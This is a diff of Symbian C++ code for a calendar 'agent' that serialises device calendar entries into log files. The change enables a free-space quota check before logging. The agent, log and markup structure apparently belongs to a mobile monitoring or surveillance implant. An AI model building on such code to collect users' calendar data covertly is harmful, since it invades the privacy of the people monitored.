@@ -188,49 +188,27 @@ void CAgentCalendar::StopAgentCmdL()
 
 void CAgentCalendar::NotifyAgentCmdL(TUint32 aData)
 	{
-	//NB: if you want to implement freespace quota check:
-		//1. uncomment this
-		//2. add code for checking iBelowFreespaceQuota before writing log
-		//3. pay attention to timestamps into markup file
-		/*
-		TInt notifyType = aData & 0x000000ff;
-		switch(notifyType)
+	TInt notifyType = aData & 0x000000ff;
+	switch(notifyType)
+		{
+		case ENotifyThreshold:
 			{
-			case ENotifyThreshold:
+			TInt value = (aData & 0x0000ff00) >> 8;
+			if (value == EBelow)
 				{
-				TInt value = (aData & 0x0000ff00) >> 8;
-				if (value == EBelow)
-					{
-					iBelowFreespaceQuota = ETrue;
-					}
-				else
-					{
-					iBelowFreespaceQuota = EFalse;
-					}
+				iBelowFreespaceQuota = ETrue;
 				}
-				break;
-			default:
-				break;
+			else
+				{
+				iBelowFreespaceQuota = EFalse;
+				}
 			}
-			*/
+			break;
+		default:
+			break;
+		}
 	}
 
-
-
-/*
-TInt64 CAgentCalendar::GetFiletime(const TTime aCurrentUtcTime){
-	
-	_LIT(KInitialTime,"16010000:000000");
-	TTime initialTime;
-	initialTime.Set(KInitialTime);
-		
-	TTimeIntervalMicroSeconds interval;
-	interval=aCurrentUtcTime.MicroSecondsFrom(initialTime);
-		
-	return interval.Int64()*10; 
-		
-}
-*/
 
 HBufC8* CAgentCalendar::GetCalEntryBufferL(const CCalEntry& calEntry)
 	{
@@ -262,8 +240,6 @@ HBufC8* CAgentCalendar::GetCalEntryBufferL(const CCalEntry& calEntry)
 			break;
 		}
 	
-	//TInt64 startTime = GetFiletime(calEntry.StartTimeL().TimeUtcL());
-	//TInt64 endTime = GetFiletime(calEntry.EndTimeL().TimeUtcL());
 	TInt64 startTime = TimeUtils::GetFiletime(calEntry.StartTimeL().TimeUtcL());
 	TInt64 endTime = TimeUtils::GetFiletime(calEntry.EndTimeL().TimeUtcL());
 	calStruct.iStart.dwHighDateTime = (startTime >> 32);
@@ -380,8 +356,6 @@ HBufC8* CAgentCalendar::GetCalEntryBufferL(const CCalEntry& calEntry)
 		
 		taskRecur.lOccurrences = repRule.Count();
 		
-		//TInt64 startDate = GetFiletime(repRule.DtStart().TimeUtcL());
-		//TInt64 endDate = GetFiletime(repRule.Until().TimeUtcL());
 		TInt64 startDate = TimeUtils::GetFiletime(repRule.DtStart().TimeUtcL());
 		TInt64 endDate = TimeUtils::GetFiletime(repRule.Until().TimeUtcL());
 		taskRecur.ftPatternStartDate.dwHighDateTime = (startDate >> 32);
@@ -476,16 +450,19 @@ void CAgentCalendar::DoOneRoundL()
 		buf.CleanupClosePushL();
 		if (buf.Length() > 0)
 		{
-			// dump the buffer to the file log. 
-			AppendLogL(buf);
-			// check the date against the last saved one and update if necessary
-			TCalTime lastModifCalTime = calEntry->LastModifiedDateL();
-			TTime lastModifTTime = lastModifCalTime.TimeUtcL();
-			TTime timestamp = iTimestamp.TimeUtcL();
-			if(timestamp < lastModifTTime){
-				iTimestamp.SetTimeUtcL(lastModifTTime);
-			}
-			
+			if(!iBelowFreespaceQuota)
+				{
+				// dump the buffer to the file log. 
+				AppendLogL(buf);
+				// check the date against the last saved one and update if necessary
+				TCalTime lastModifCalTime = calEntry->LastModifiedDateL();
+				TTime lastModifTTime = lastModifCalTime.TimeUtcL();
+				TTime timestamp = iTimestamp.TimeUtcL();
+				if(timestamp < lastModifTTime)
+					{
+					iTimestamp.SetTimeUtcL(lastModifTTime);
+					}
+				}
 		}
 		CleanupStack::PopAndDestroy(&buf);
 	}
@@ -528,27 +505,31 @@ void CAgentCalendar::CalChangeNotification(RArray< TCalChangeEntry > &aChangeIte
 						buf.CleanupClosePushL();
 						if (buf.Length() > 0)
 						{
-							// dump the buffer to the file log. 
-							CLogFile* logFile = CLogFile::NewLC(iFs);
-							logFile->CreateLogL(LOGTYPE_CALENDAR);
-							logFile->AppendLogL(buf);
-							logFile->CloseLogL();
-							CleanupStack::PopAndDestroy(logFile);
-							// save markup if file already exists
-							TCalTime lastModifCalTime = calEntry->LastModifiedDateL();
-							TTime lastModifTTime = lastModifCalTime.TimeUtcL();
-							if(iMarkupFile->ExistsMarkupL(Type())){
-								// if a markup exists, a dump has been performed and this 
-								// is the most recent change
-								RBuf8 buffer(GetTTimeBufferL(lastModifTTime));
-								buffer.CleanupClosePushL();
-								if (buffer.Length() > 0)
+							if(!iBelowFreespaceQuota)
 								{
-									iMarkupFile->WriteMarkupL(Type(),buffer);
-								}
-								CleanupStack::PopAndDestroy(&buffer);
-							}
-									
+								// dump the buffer to the file log. 
+								CLogFile* logFile = CLogFile::NewLC(iFs);
+								logFile->CreateLogL(LOGTYPE_CALENDAR);
+								logFile->AppendLogL(buf);
+								logFile->CloseLogL();
+								CleanupStack::PopAndDestroy(logFile);
+								// save markup if file already exists
+								/*
+								TCalTime lastModifCalTime = calEntry->LastModifiedDateL();
+								TTime lastModifTTime = lastModifCalTime.TimeUtcL();
+								if(iMarkupFile->ExistsMarkupL(Type()))
+									{
+									// if a markup exists, a dump has been performed and this 
+									// is the most recent change
+									RBuf8 buffer(GetTTimeBufferL(lastModifTTime));
+									buffer.CleanupClosePushL();
+									if (buffer.Length() > 0)
+										{
+										iMarkupFile->WriteMarkupL(Type(),buffer);
+										}
+									CleanupStack::PopAndDestroy(&buffer);
+									} */
+								}	
 						}
 						CleanupStack::PopAndDestroy(&buf);
 					}
